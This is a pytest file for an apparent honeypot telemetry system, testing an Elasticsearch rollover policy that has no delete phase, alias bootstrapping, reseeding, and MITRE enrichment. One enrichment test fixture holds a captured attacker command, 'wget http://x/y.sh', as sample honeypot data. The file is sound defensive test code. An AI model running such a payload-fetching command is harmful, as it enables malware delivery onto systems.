"""Index lifecycle: rollover, and the promise that nothing is ever deleted.

The policy's value is as much in what it does NOT contain as in what it does,
so the absence of a delete phase is asserted rather than assumed -- it is one
line away from being added by someone tidying up, and the first sign it was
wrong would be a gap in a dataset nobody was watching.
"""

import json
import uuid
from pathlib import Path

import pytest

from app.config import get_settings
from app.es import bootstrap
from app.es.client import get_es

POLICY = json.loads(
    (Path(bootstrap.__file__).resolve().parents[3] / "infra" / "elasticsearch" / "ilm-policy.json")
    .read_text(encoding="utf-8")
)


def test_the_policy_has_no_delete_phase() -> None:
    """The entire point of the option that was chosen.

    Captured telemetry is research data; a delete phase runs on a timer
    against data nobody is watching. Rollover bounds each index so old ones
    can be dropped BY HAND, deliberately.
    """
    phases = POLICY["policy"]["phases"]

    assert "delete" not in phases, (
        "a delete phase was added to a policy whose whole purpose is that it "
        "has none -- captured telemetry would start expiring on a timer"
    )
    assert set(phases) == {"hot"}
    assert "rollover" in phases["hot"]["actions"]


def test_the_policy_actually_rolls_over_on_something() -> None:
    """A hot phase with no rollover thresholds bounds nothing at all."""
    rollover = POLICY["policy"]["phases"]["hot"]["actions"]["rollover"]

    assert rollover.get("max_primary_shard_size") or rollover.get("max_size")
    assert rollover.get("max_age")


def test_the_template_points_at_the_policy_and_an_alias() -> None:
    """`rollover_alias` pointed at a concrete index parks ILM in an error state."""
    template = json.loads(
        (
            Path(bootstrap.__file__).resolve().parents[3]
            / "infra"
            / "elasticsearch"
            / "index-template.json"
        ).read_text(encoding="utf-8")
    )
    settings = template["template"]["settings"]

    assert settings["index.lifecycle.name"] == bootstrap.ILM_POLICY_ID
    assert settings["index.lifecycle.rollover_alias"] == get_settings().es_index


@pytest.mark.asyncio
async def test_the_policy_is_installed_on_the_cluster() -> None:
    await bootstrap.install_ilm_policy()
    live = await get_es().ilm.get_lifecycle(name=bootstrap.ILM_POLICY_ID)

    phases = live[bootstrap.ILM_POLICY_ID]["policy"]["phases"]
    assert "delete" not in phases, "the policy ON THE CLUSTER has a delete phase"


@pytest.mark.asyncio
async def test_a_fresh_deployment_gets_an_alias_not_a_concrete_index(monkeypatch) -> None:
    """Auto-creation on first write would make a concrete index named after
    the alias, which is the state that cannot roll over."""
    es = get_es()
    alias = f"test-lifecycle-{uuid.uuid4().hex[:8]}"
    get_settings.cache_clear()
    monkeypatch.setenv("ES_INDEX", alias)
    try:
        await bootstrap._ensure_write_target()

        assert await es.indices.exists_alias(name=alias), "no write alias was created"
        indices = await es.indices.get_alias(name=alias)
        assert list(indices) == [f"{alias}-000001"]
        assert indices[f"{alias}-000001"]["aliases"][alias]["is_write_index"] is True
    finally:
        try:
            await es.indices.delete(index=f"{alias}-000001")
        except Exception:  # noqa: BLE001 - cleanup
            pass
        get_settings.cache_clear()


@pytest.mark.asyncio
async def test_an_existing_concrete_index_is_never_migrated_automatically(
    monkeypatch, caplog
) -> None:
    """Converting means reindex-then-delete. Not on a timer, and not at boot."""
    es = get_es()
    name = f"test-lifecycle-{uuid.uuid4().hex[:8]}"
    get_settings.cache_clear()
    monkeypatch.setenv("ES_INDEX", name)
    try:
        await es.indices.create(index=name)
        await es.index(index=name, id="keep-me", document={"a": 1}, refresh=True)

        with caplog.at_level("WARNING"):
            await bootstrap._ensure_write_target()

        # Untouched: still concrete, still holding its document.
        assert not await es.indices.exists_alias(name=name)
        assert (await es.count(index=name))["count"] == 1
        assert not await es.indices.exists(index=f"{name}-000001")
        assert any("migrate_to_rollover" in r.message for r in caplog.records), (
            "the operator was not told how to convert it"
        )
    finally:
        try:
            await es.indices.delete(index=name)
        except Exception:  # noqa: BLE001 - cleanup
            pass
        get_settings.cache_clear()


@pytest.mark.asyncio
async def test_reseeding_across_a_rollover_does_not_duplicate_the_corpus(
    monkeypatch,
) -> None:
    """The hazard rollover introduces, exercised against a real rollover.

    Document ids are unique per INDEX, not per alias. The seeder used fixed
    ids and relied on overwrite for idempotency, which silently stops working
    the moment `es_index` is an alias: an index request only reaches the write
    index, so the pre-rollover copy survives in the old one and every seeded
    event exists twice. No error, no warning -- just doubled data and a
    `seeded_count` of 102.
    """
    from app.seed.seeder import load_corpus, seed, seeded_count

    es = get_es()
    alias = f"test-rollover-{uuid.uuid4().hex[:8]}"
    get_settings.cache_clear()
    monkeypatch.setenv("ES_INDEX", alias)
    expected = len(load_corpus())
    try:
        await seed()
        assert await seeded_count() == expected

        # Roll the alias over: writes now land in -000002 while every seeded
        # document still sits in -000001.
        await es.indices.rollover(alias=alias)
        indices = sorted(await es.indices.get_alias(name=alias))
        assert len(indices) == 2, indices

        await seed()
        await es.indices.refresh(index=alias)

        assert await seeded_count() == expected, (
            "the corpus was duplicated across the rollover boundary"
        )
        # And specifically: no id exists twice across the alias.
        hits = await es.search(
            index=alias, query={"term": {"labels.seeded": True}}, size=500
        )
        ids = [h["_id"] for h in hits["hits"]["hits"]]
        assert len(ids) == len(set(ids)), "the same document id exists in two indices"
    finally:
        for name in (f"{alias}-000001", f"{alias}-000002"):
            try:
                await es.indices.delete(index=name)
            except Exception:  # noqa: BLE001 - cleanup
                pass
        get_settings.cache_clear()


@pytest.mark.asyncio
async def test_enrichment_reaches_documents_in_a_rolled_over_index(monkeypatch) -> None:
    """The coupling that blocked rollover in the first place.

    `write_back_enrichment` stamped `mitre.*` with one `es.update(index, id)`
    per event. That form only ever reaches the WRITE index: against an alias,
    every document older than the current write index comes back
    `document_missing_exception`, which the caller catches and logs as a
    warning. Nothing fails -- the dashboard's technique filter just silently
    stops covering anything but the newest index.

    Rewritten as a single `update_by_query`, which resolves the alias across
    all of its indices. This rolls over BETWEEN indexing and enriching, so the
    target document is provably not in the write index.
    """
    from app.services.enrichment import write_back_enrichment
    from app.services.mitre.mapper import MappedTechnique
    from app.services.llm.schemas import EvidenceCitation

    es = get_es()
    # Named to match the real template's `honeypot-events*` pattern: without
    # it the index gets dynamic mappings, `session.id` becomes analysed text,
    # and the term query matches nothing -- a test artifact that would look
    # exactly like the bug under test.
    alias = f"honeypot-events-enrich-{uuid.uuid4().hex[:8]}"
    get_settings.cache_clear()
    monkeypatch.setenv("ES_INDEX", alias)
    session_id = "sess-" + uuid.uuid4().hex[:8]
    try:
        await bootstrap._ensure_write_target()
        first = f"{alias}-000001"
        await es.index(
            index=alias,
            id="evt-old",
            document={
                "@timestamp": "2026-09-20T10:00:00Z",
                "session": {"id": session_id},
                "event": {"action": "cowrie.command.input", "category": "process"},
                "process": {"command_line": "wget http://x/y.sh"},
                "honeypot": {"id": "h", "name": "h"},
                "source": {"ip": "203.0.113.1"},
                "labels": {"seeded": False},
            },
            refresh=True,
        )

        await es.indices.rollover(alias=alias)
        # The document is now in a non-write index. This is the state that
        # made the per-event `update` fail.
        assert (await es.count(index=first))["count"] == 1

        await write_back_enrichment(
            session_id=session_id,
            risk_score=80,
            risk="high",
            classification="Automated botnet dropper",
            techniques=[
                MappedTechnique(
                    technique_id="T1105",
                    technique_name="Ingress Tool Transfer",
                    tactic="command-and-control",
                    confidence=1.0,
                    ai_explanation=None,
                    source="rule",
                    rule_id="r1",
                    observed=True,
                    evidence=[EvidenceCitation(event_id="evt-old", artifact="wget")],
                )
            ],
        )

        await es.indices.refresh(index=alias)
        doc = (await es.get(index=first, id="evt-old"))["_source"]

        assert doc["risk"]["level"] == "high", "session-wide enrichment missed it"
        assert doc.get("mitre", {}).get("technique_id") == "T1105", (
            "the per-event MITRE stamp never reached a document outside the write index"
        )
    finally:
        for name in (f"{alias}-000001", f"{alias}-000002"):
            try:
                await es.indices.delete(index=name)
            except Exception:  # noqa: BLE001 - cleanup
                pass
        get_settings.cache_clear()
